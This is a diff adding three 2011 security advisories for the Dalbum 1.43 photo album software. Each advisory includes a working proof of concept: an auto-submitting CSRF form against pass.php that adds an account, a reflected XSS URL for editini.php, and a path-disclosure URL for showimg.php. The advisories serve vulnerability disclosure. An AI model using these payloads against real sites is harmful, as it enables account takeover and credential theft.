@@ -1,0 +1,74 @@
+===============================
+Vulnerability ID: HTB22941
+Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_dalbum.html
+Product: Dalbum
+Vendor: http://www.dalbum.org/ ( http://www.dalbum.org/ ) 
+Vulnerable Version: 1.43
+Vendor Notification: 05 April 2011 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Risk level: Low 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "pass.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+[html]
+<form action="http://[host]/pass.php" method="post" name="main" />
+<input name="user" value="1" type="hidden" />
+<input name="pass" value="1" type="hidden" />
+<input name="passc" value="1" type="hidden" />
+<input type="hidden" name="action" value="add">
+<input type="submit" id="btn" name="submit" value="Submit ››">
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
+[/html]
+
+===============================
+Vulnerability ID: HTB22943
+Reference: http://www.htbridge.ch/advisory/xss_in_dalbum.html
+Product: Dalbum
+Vendor: http://www.dalbum.org/ ( http://www.dalbum.org/ ) 
+Vulnerable Version: 1.43
+Vendor Notification: 05 April 2011 
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "editini.php" script to properly sanitize user-supplied input in "url" variable.
+User can execute arbitrary JavaScript code within the vulnerable application.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+[code]
+http://[host]/editini.php?album=/Sample%20album/&url=1%27%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
+[/code]
+
+===============================
+Vulnerability ID: HTB22942
+Reference: http://www.htbridge.ch/advisory/path_disclousure_in_dalbum.html
+Product: Dalbum
+Vendor: http://www.dalbum.org/ ( http://www.dalbum.org/ ) 
+Vulnerable Version: 1.43
+Vendor Notification: 05 April 2011 
+Vulnerability Type: Path disclosure
+Risk level: Low 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "showimg.php" script, it's possible to generate an error that will reveal the full path of the script.
+A remote user can determine the full path to the web root directory and other potentially sensitive information.
+
+The following PoC is available:
+
+[code]
+http://[host]/showimg.php?file=/Sample%20album/sample.jpg&details=1&rotate[]=1
+[/code]
+
